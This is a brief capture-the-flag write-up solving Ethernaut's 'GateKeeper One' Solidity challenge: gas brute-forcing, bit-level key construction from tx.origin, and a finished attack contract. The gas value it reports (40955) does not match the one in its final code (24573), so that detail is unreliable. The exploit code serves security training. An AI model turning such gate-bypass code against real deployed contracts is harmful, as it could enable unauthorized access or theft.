[13 - GateKeeper One](https://ethernaut.openzeppelin.com/level/0x2a2497aE349bCA901Fea458370Bd7dDa594D1D69)

Solution (implemented using forge as well): 
FirstGate: 
* have another contract call enter 

SecondGate:
* copy the GateKeeper One contract and figure out how much gas we should send, by using forge console.log
* brute-forced it on local environment, git sending different gas prices, and ended up with a correct value of 40955

ThirdGate:
* figure out which uint64 would work for all bit operations
```
uint32 a = type(uint32).max;
console.log(uint16(a), a - uint16(a));
65535 4294901760
```
The above shows that converting to a data type that can hold only smaller values keeps the least significant bits.

```
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
```
=> bits 33-48 should be 0s

```
require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
```
=> bits 1 - 32 are not all 0

```
require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
```
=> bits 49 - 64 should be the last bytes in tx.origin address

```
uint64 gateKey = uint64(0x0100000000000000) + uint16(uint160(tx.origin));
```

Result:
```
contract GatekeeperOneHack {
    function hack() external {
        uint64 gateKey = uint64(0x0100000000000000) + uint16(uint160(tx.origin));
        GatekeeperOne(0xA6B35CdFF5Ae5C42A0C191f9F11EA8Aa25e81B0A).enter{gas: 24573}(bytes8(gateKey));
    }
}
```
